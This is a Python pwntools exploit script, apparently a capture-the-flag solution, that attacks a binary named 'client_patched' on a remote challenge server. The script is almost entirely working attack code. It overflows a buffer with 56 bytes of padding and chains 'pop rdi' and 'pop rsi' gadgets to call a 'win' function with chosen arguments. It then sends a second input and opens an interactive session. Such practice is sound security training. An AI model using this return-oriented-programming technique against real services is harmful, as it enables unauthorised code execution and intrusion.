from pwn import *

# ===========================================================
#                       CONFIG SETUP
# ===========================================================
def initIO(argv=[]):
    if (args.LOCAL):
        if (args.GDB):
            return gdb.debug(argv or [elf.path], gdbscript=script)
        return elf.process()

    host = conn.split(' ')[0]
    port = int(conn.split(' ')[1])

    return remote(host, port)
        
if (args.DEBUG):
    context.log_level = "debug"

context.terminal = [
    'kitty', '@', 'launch',
    '--type', 'window',
    '--location', 'vsplit',
    'sh', '-c'
]


elf = "./client_patched"
if (elf != ""):
    elf = context.binary = ELF(elf)

libc = ""
if (libc != ""):
    libc = ELF(libc, checksec=False)
if (args.LOCAL):
    libc = elf.libc

script = """
    b* main+174
    c
"""

conn = "sisterlab.id 42003"
io = initIO()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

pop_rdi_ret = next(elf.search(asm("pop rdi; ret")))
pop_rsi_ret = next(elf.search(asm("pop rsi; ret")))

payload = b'A' * 56
payload += p64(pop_rdi_ret)
payload += p64(0xCAFECAFE)
payload += p64(pop_rsi_ret)
payload += p64(elf.bss(0x48))
payload += p64(elf.sym['win'])
payload += b' ' * 8

io.sendafter(b'> ', payload)

io.sendlineafter(b'> ', b'level 5 gyatt rizz')

# ===========================================================
#                       INTERACTIVE
# ===========================================================

io.interactive()
